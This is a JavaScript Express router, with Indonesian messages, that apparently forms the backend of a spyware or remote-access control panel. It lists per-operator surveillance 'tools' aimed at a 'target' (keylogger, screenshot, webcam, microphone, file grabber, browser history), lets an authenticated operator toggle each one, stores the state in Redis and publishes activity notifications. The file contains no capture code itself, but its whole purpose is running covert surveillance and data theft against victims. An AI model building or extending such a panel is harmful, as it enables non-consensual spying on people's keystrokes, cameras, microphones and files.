import express from 'express';
import redis from '../lib/upstash.js';
import { authMiddleware } from '../middleware/auth.js';

const router = express.Router();

const defaultTools = [
  { name: 'keylogger', description: 'Merekam semua input keyboard target', active: false },
  { name: 'screenshot', description: 'Mengambil screenshot layar target', active: false },
  { name: 'webcam', description: 'Mengakses kamera target', active: false },
  { name: 'microphone', description: 'Merekam suara target', active: false },
  { name: 'filegrabber', description: 'Mengambil file dari target', active: false },
  { name: 'browserhistory', description: 'Mengambil history browser target', active: false },
];

// Get all tools
router.get('/', authMiddleware, async (req, res) => {
  try {
    const { username } = req.user;
    let tools = await redis.get(`tools:${username}`);

    if (!tools) {
      tools = defaultTools;
      await redis.set(`tools:${username}`, JSON.stringify(tools));
    } else {
      tools = JSON.parse(tools);
    }

    res.json(tools);
  } catch (err) {
    console.error('Get tools error:', err);
    res.json(defaultTools);
  }
});

// Toggle tool
router.post('/:toolName/toggle', authMiddleware, async (req, res) => {
  try {
    const { username } = req.user;
    const { toolName } = req.params;
    const { active } = req.body;

    let tools = await redis.get(`tools:${username}`);
    if (!tools) {
      tools = defaultTools;
    } else {
      tools = JSON.parse(tools);
    }

    const tool = tools.find(t => t.name === toolName);
    if (!tool) {
      return res.status(404).json({ message: 'Tool tidak ditemukan' });
    }

    tool.active = active;
    await redis.set(`tools:${username}`, JSON.stringify(tools));

    // Log activity
    await redis.publish('notifications', JSON.stringify({
      userId: username,
      message: `Tool ${toolName} ${active ? 'diaktifkan' : 'dinonaktifkan'}`,
      time: new Date().toISOString()
    }));

    res.json({ message: `Tool ${toolName} ${active ? 'diaktifkan' : 'dinonaktifkan'}`, tool });
  } catch (err) {
    console.error('Toggle tool error:', err);
    res.status(500).json({ message: 'Terjadi kesalahan server' });
  }
});

export default router;
